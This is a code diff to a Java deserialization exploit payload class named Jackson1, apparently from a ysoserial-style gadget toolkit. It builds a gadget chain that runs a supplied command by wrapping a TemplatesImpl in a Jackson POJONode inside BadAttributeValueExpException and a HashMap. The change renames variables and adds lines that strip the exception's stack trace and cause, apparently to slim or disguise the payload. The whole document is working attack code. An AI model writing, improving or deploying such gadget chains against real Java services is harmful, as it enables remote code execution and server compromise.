@@ -10,13 +10,15 @@ import javassist.CtMethod;
 import javax.management.BadAttributeValueExpException;
 import java.util.HashMap;
 
+import static com.qi4l.JYso.gadgets.utils.Reflections.setFieldValue;
+
 // 在触发 getter 的时候是以随机顺序触发的,所以概率打空
 public class Jackson1 implements ObjectPayload<Object> {
 
     @Override
     public Object getObject(String command) throws Exception {
-        final Object template;
-        template = Gadgets.createTemplatesImpl(command);
+        final Object tempImpl;
+        tempImpl = Gadgets.createTemplatesImpl(command);
 
         try {
             CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
@@ -27,13 +29,17 @@ public class Jackson1 implements ObjectPayload<Object> {
 
         }
 
-        POJONode node = new POJONode(template);
+        POJONode node = new POJONode(tempImpl);
 
-        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
-        Reflections.setFieldValue(badAttributeValueExpException, "val", node);
+        BadAttributeValueExpException val  = new BadAttributeValueExpException(null);
+        setFieldValue(val, "val", node);
+        //清除堆栈信息
+        setFieldValue(val, "stackTrace", new StackTraceElement[0]);
+        setFieldValue(val, "cause", null);
+        setFieldValue(val, "suppressedExceptions", null);
 
         HashMap hashMap = new HashMap();
-        hashMap.put(template, badAttributeValueExpException);
+        hashMap.put(tempImpl, val);
 
         return hashMap;
     }
